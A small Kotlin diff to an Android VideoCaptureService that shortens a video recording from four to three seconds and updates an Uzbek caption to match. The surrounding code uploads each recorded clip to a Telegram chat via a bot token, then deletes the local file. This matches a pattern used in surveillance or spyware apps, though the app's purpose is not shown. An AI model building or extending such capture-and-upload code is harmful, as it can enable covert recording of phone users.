@@ -35,7 +35,7 @@ class VideoCaptureService : Service() {
         private const val NOTIF_ID = 44
         private const val MIN_WARMUP_FRAMES = 15
         private const val WARMUP_TIMEOUT_MS = 1500L
-        private const val RECORD_DURATION_MS = 4000L
+        private const val RECORD_DURATION_MS = 3000L
     }
 
     override fun onCreate() {
@@ -202,7 +202,7 @@ class VideoCaptureService : Service() {
 
         Thread {
             if (file != null && file.exists() && token.isNotEmpty() && chatId.isNotEmpty()) {
-                TelegramSender.sendVideo(token, chatId, file.readBytes(), "🎥 Video (4 soniya)")
+                TelegramSender.sendVideo(token, chatId, file.readBytes(), "🎥 Video (3 soniya)")
                 file.delete()
             }
             stopSelf()
